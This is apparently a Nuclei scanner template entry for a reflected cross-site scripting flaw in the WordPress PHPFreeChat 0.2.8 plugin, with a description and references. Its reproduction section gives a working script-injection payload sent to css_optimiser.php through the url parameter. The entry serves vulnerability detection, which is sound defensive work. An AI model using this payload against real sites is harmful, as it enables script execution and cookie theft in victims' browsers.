# Nuclei Template: WordPress PHPFreeChat 0.2.8 - Cross-Site Scripting
**Template ID:** wp-phpfreechat-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-phpfreechat-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress PHPFreeChat 0.2.8 plugin contains a cross-site scripting vulnerability via the url parameter. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://www.exploit-db.com/exploits/37485
- http://web.archive.org/web/20210120061848/https://www.securityfocus.com/bid/54332/info
